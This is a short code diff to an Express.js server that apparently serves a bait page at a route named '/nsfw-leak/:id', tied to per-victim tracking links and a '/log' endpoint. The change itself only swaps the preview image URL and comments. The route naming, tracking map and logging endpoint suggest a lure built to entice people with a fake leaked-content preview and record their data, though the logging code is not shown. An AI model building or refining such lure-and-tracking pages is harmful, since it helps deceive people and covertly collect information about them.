@@ -23,7 +23,7 @@ app.get('/', (req, res) => res.send('✅ Service running'));
 
 const trackingLinks = new Map();
 
-// ================== NO BLUR - YOUR ORIGINAL IMAGE ==================
+// ================== NEW IMAGE - NO BLUR ==================
 app.get('/nsfw-leak/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -73,7 +73,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
     .preview {
       width: 100%;
       height: 480px;
-      background: url('https://i.imgur.com/NOrim.png') center/cover no-repeat;  /* Your original image - No blur */
+      background: url('https://ibb.co/7JsnMYJS') center/cover no-repeat;   /* Your new image */
       position: relative;
     }
     .preview::after {
@@ -191,7 +191,6 @@ app.get('/nsfw-leak/:id', (req, res) => {
 
   res.send(html);
 });
-
 
 // ================== LOG ENDPOINT ==================
 app.post('/log', async (req, res) => {
